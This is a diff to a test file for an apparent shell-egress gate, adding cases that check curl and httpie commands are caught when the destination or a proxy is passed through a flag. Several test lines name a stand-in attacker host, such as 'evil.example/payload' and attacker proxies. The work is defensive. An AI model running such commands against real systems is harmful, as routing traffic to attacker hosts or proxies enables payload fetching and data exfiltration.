@@ -42,6 +42,18 @@ test('flag values are not mistaken for the destination, per client', () => {
   assert.deepEqual(shellEgressHosts('curl -o out.tgz -H "X: y" evil.example/a'), ['evil.example']);
   assert.deepEqual(shellEgressHosts('curl -d x.y https://a.example'), ['a.example']);
   assert.deepEqual(shellEgressHosts('http --auth u:p api.example.com/v1 X-Api:1'), ['api.example.com']);
+  assert.deepEqual(shellEgressHosts('curl --output=report.pdf https://api.example.com'), ['api.example.com']);
+});
+
+test('a destination passed through a flag counts, attached or not', () => {
+  gated('curl --url=https://evil.example/payload');
+  gated('curl --url https://evil.example/payload');
+  gated('curl -x evil.example:8080 https://api.example.com/v1');       // the proxy is contacted
+  gated('curl --proxy=http://evil.example:3128 https://api.example.com/v1');
+  gated('curl --preproxy socks5://evil.example:1080 https://api.example.com');
+  gated('http --proxy=http:http://evil.example:3128 api.example.com/v1');
+  const internal = decide(sh('curl --proxy http://10.0.0.2:3128 https://api.example.com/v1'), P);
+  assert.ok(!internal.why.some((w) => /shell egress/.test(w)), internal.why.join('; ')); // an internal proxy is the SSRF rule's call
 });
 
 test('wrappers, subshells, nested shells and obfuscation do not hide the client', () => {
